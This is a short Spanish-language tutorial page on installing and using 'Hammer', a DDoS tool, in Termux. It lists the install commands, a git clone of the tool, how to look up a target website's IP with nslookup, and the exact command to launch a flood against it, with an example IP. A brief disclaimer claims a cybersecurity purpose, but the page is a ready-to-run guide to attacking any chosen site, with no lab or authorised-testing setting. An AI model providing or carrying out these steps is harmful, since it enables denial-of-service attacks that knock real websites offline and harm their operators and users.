Como usar Hammer?
<p>
Hammer es una herramienta que te permitira hacer ataques DDos en termux, con el fin de ciberseguridad y nunca<br>
con fines malintencionados, para instalar Hammer en terminal:<br>

$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/Jose21NC/Hammer/

Hammer necesita la <b>Direccion IP</b>Del sitio que quieres atacar...<br>
Para obtenerlo...escribe<br>
$ <b>nslookup nombredelsitio.com<b><br>
Luego de Obtener la IP<br>

Para hacer el ataque<br>
$ cd Hammer<br>
$ python hammer.py -s [Direccion IP] -t 135<br>
Ejemplo:<br>
$ python hammer.py -s 123.45.67.89 -t 135<br>

Tutorial en video:
Aun no disponible, lo estare subiendo en unos dias
